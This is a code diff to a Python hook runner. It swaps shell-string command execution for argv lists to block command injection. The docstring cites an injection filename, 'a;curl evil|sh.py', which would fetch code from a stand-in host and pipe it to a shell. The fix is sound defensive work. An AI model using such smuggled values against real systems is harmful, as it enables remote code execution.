@@ -7,12 +7,11 @@ from __future__ import annotations
 
 import json
 import shutil
+import subprocess
 import sys
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-
-from atelier.core.capabilities.tool_supervision.bash_exec import run_command
 
 # -- language detection -------------------------------------------------------
 
@@ -228,6 +227,27 @@ class HookResult:
 # -- main runner --------------------------------------------------------------
 
 
+def _run_argv(cmd: list[str], *, cwd: str, timeout: int) -> tuple[int, str]:
+    """Run a hook command as an argv list (shell=False) and return (exit_code, stdout).
+
+    Passing the list directly keeps each filename a discrete argument, so a path
+    like ``a;curl evil|sh.py`` or ``my file.py`` can never be re-parsed as shell
+    syntax. A timeout or spawn failure yields a non-zero exit code with no output.
+    """
+    try:
+        proc = subprocess.run(
+            cmd,
+            cwd=cwd,
+            capture_output=True,
+            text=True,
+            timeout=max(timeout, 0),
+            check=False,
+        )
+    except (subprocess.TimeoutExpired, OSError):
+        return -1, ""
+    return proc.returncode, proc.stdout or ""
+
+
 def run_post_edit_hooks(
     touched_paths: list[str],
     *,
@@ -266,11 +286,10 @@ def run_post_edit_hooks(
         all_ok = True
         for cmd in cmds:
             step_timeout = min(cfg.timeout_per_step_s, budget_remaining)
-            cmd_str = " ".join(cmd)
-            run_result = run_command(cmd_str, cwd=cwd or str(repo_root), timeout=int(step_timeout))
+            exit_code, _ = _run_argv(cmd, cwd=cwd or str(repo_root), timeout=int(step_timeout))
             elapsed = time.perf_counter() - t0
             budget_remaining -= elapsed
-            if run_result.exit_code not in (0, 1):  # 1 is "found issues" for linters, not fatal
+            if exit_code not in (0, 1):  # 1 is "found issues" for linters, not fatal
                 all_ok = False
         if all_ok:
             result.steps_ran.append(step_name)
@@ -288,15 +307,14 @@ def run_post_edit_hooks(
         for source, cmd in cmds:
             step_timeout = min(cfg.timeout_per_step_s, budget_remaining)
             t0 = time.perf_counter()
-            cmd_str = " ".join(cmd)
-            run_result = run_command(cmd_str, cwd=cwd or str(repo_root), timeout=int(step_timeout))
+            _, stdout = _run_argv(cmd, cwd=cwd or str(repo_root), timeout=int(step_timeout))
             budget_remaining -= time.perf_counter() - t0
             if source == "ruff":
-                result.diagnostics.extend(_parse_ruff_json(run_result.stdout, "ruff"))
+                result.diagnostics.extend(_parse_ruff_json(stdout, "ruff"))
             elif source == "tsc":
-                result.diagnostics.extend(_parse_tsc_output(run_result.stdout))
+                result.diagnostics.extend(_parse_tsc_output(stdout))
             elif source == "cargo_clippy":
-                result.diagnostics.extend(_parse_cargo_clippy_json(run_result.stdout))
+                result.diagnostics.extend(_parse_cargo_clippy_json(stdout))
         result.steps_ran.append(step_name)
 
     for lang, paths in by_lang.items():
